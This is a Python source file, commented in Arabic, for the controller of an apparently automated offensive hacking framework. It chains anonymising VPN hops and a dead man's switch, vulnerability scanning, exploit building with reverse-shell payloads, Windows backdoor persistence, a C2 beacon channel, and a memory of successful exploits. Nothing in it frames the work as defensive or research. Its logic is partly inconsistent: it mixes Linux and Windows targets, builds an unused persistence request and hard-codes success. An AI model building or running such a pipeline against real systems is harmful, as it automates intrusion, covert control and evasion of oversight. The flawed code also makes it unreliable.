"""
Mission Controller - ينسق بين جميع الطبقات
"""

import logging
from typing import List, Dict, Optional
from pathlib import Path

from ..shared_models import (
    VulnerabilityReport, ExploitRequest, ExploitResult,
    PersistenceRequest, C2Command, LearningFeedback
)

# استيراد الطبقات
from opsec_shield import VPNChainManager, DeadMansSwitch
from hacker_brain import AttackerMindset
from vulnerability_hunter import WebVulnerabilityScanner
from exploit_developer import ExploitBuilder, PayloadCrafter
from backdoor_factory import WindowsPersistence, StealthImplant
from c2_channel import BeaconProtocol
from self_learning import ExperienceMemory

logger = logging.getLogger(__name__)


class MissionController:
    """
    يتحكم في تدفق العمل بين الطبقات:
    1. يطلب من OPSEC Shield تجهيز قنوات الإخفاء
    2. يطلب من Hacker Brain تحليل الموقف واتخاذ القرارات
    3. يطلب من Vulnerability Hunter مسح الهدف
    4. يمرر الثغرات إلى Exploit Developer
    5. يمرر الاستغلال الناجح إلى Backdoor Factory
    6. ينشئ قناة C2 ويرسل الأوامر
    7. يسجل كل شيء في Self-Learning Engine
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.current_mission_id = None
        self.current_target = None
        
        # تهيئة الطبقات
        self.opsec = VPNChainManager(simulation_mode=config.get("simulation", True))
        self.deadswitch = DeadMansSwitch()
        self.brain = AttackerMindset()
        self.scanner = WebVulnerabilityScanner()
        self.exploit_builder = ExploitBuilder()
        self.payload_crafter = PayloadCrafter()
        self.persistence = WindowsPersistence()
        self.c2 = BeaconProtocol(c2_endpoint=config.get("c2_url", "https://c2.local"))
        self.memory = ExperienceMemory()
        
        logger.info("MissionController initialized")
    
    def start_mission(self, target: str, scope: List[str]) -> str:
        """بدء مهمة جديدة"""
        self.current_mission_id = f"mission_{int(__import__('time').time())}"
        self.current_target = target
        logger.info(f"Starting mission {self.current_mission_id} on {target}")
        
        # 1. تفعيل OPSEC Shield
        self.opsec.connect_chain()
        self.deadswitch.arm()
        
        return self.current_mission_id
    
    async def execute_mission(self) -> Dict:
        """
        تنفيذ المهمة خطوة بخطوة مع التواصل بين الطبقات
        """
        results = {
            "mission_id": self.current_mission_id,
            "target": self.current_target,
            "vulnerabilities": [],
            "exploits": [],
            "persistence": [],
            "c2_status": None,
            "learning_feedback": []
        }
        
        # ========== المرحلة 1: الاستطلاع والمسح ==========
        logger.info("[Phase 1] Vulnerability Hunting...")
        
        # Vulnerability Hunter يكتشف الثغرات
        vulns = await self.scanner.scan_url(self.current_target, {})
        
        for vuln in vulns:
            vuln_report = VulnerabilityReport(
                id=vuln.id,
                url=vuln.url,
                parameter=vuln.parameter,
                vuln_type=vuln.vuln_type,
                severity=vuln.severity,
                payload=vuln.payload,
                evidence=vuln.evidence,
                confidence=vuln.confidence
            )
            results["vulnerabilities"].append(vuln_report.dict())
            
            # ========== المرحلة 2: اتخاذ القرار (Hacker Brain) ==========
            logger.info(f"[Phase 2] Brain deciding on {vuln.vuln_type}...")
            
            decision = self.brain.think_before_act(
                proposed_action=f"exploit_{vuln.vuln_type}",
                context={"vulnerability": vuln_report.dict(), "target": self.current_target}
            )
            
            if decision.risk_level.value in ["critical", "high"]:
                logger.warning(f"Skipping {vuln.vuln_type} due to high risk")
                continue
            
            # ========== المرحلة 3: بناء الاستغلال (Exploit Developer) ==========
            logger.info(f"[Phase 3] Building exploit for {vuln.vuln_type}...")
            
            exploit_request = ExploitRequest(
                vuln_report=vuln_report,
                target_os="linux",
                required_payload_type="reverse_shell"
            )
            
            exploit = self.exploit_builder.build_from_vulnerability(exploit_request.dict())
            exploit_result = ExploitResult(
                exploit_id=exploit.id,
                exploit_code=exploit.payload,
                encoded_payload=exploit.encoded_payload,
                instructions=exploit.instructions,
                success_indicators=exploit.success_indicators
            )
            results["exploits"].append(exploit_result.dict())
            
            # ========== المرحلة 4: زرع الباب الخلفي (Backdoor Factory) ==========
            logger.info(f"[Phase 4] Deploying persistence...")
            
            persistence_request = PersistenceRequest(
                target=self.current_target,
                access_type="reverse_shell",
                implant_code=exploit_result.exploit_code,
                platform="windows"
            )
            
            persistence_artifacts = self.persistence.deploy_full_persistence("/tmp/implant.exe")
            results["persistence"].append([a.__dict__ for a in persistence_artifacts])
            
            # ========== المرحلة 5: إنشاء قناة C2 ==========
            logger.info(f"[Phase 5] Establishing C2 channel...")
            
            self.c2.start()
            self.c2.set_mode("high_frequency")
            results["c2_status"] = self.c2.get_status()
            
            # ========== المرحلة 6: التعلم الذاتي (تسجيل التجربة) ==========
            logger.info(f"[Phase 6] Recording experience...")
            
            feedback = LearningFeedback(
                action=f"exploit_{vuln.vuln_type}",
                outcome="success",
                context={"target": self.current_target, "vulnerability": vuln_report.dict()},
                lesson=f"Successfully exploited {vuln.vuln_type} using {exploit.payload[:50]}"
            )
            self.memory.record_experience(feedback.dict())
            results["learning_feedback"].append(feedback.dict())
        
        return results
    
    def end_mission(self):
        """إنهاء المهمة وتنظيف الآثار"""
        self.opsec.disconnect_chain()
        self.deadswitch.disarm()
        self.c2.stop()
        logger.info(f"Mission {self.current_mission_id} ended")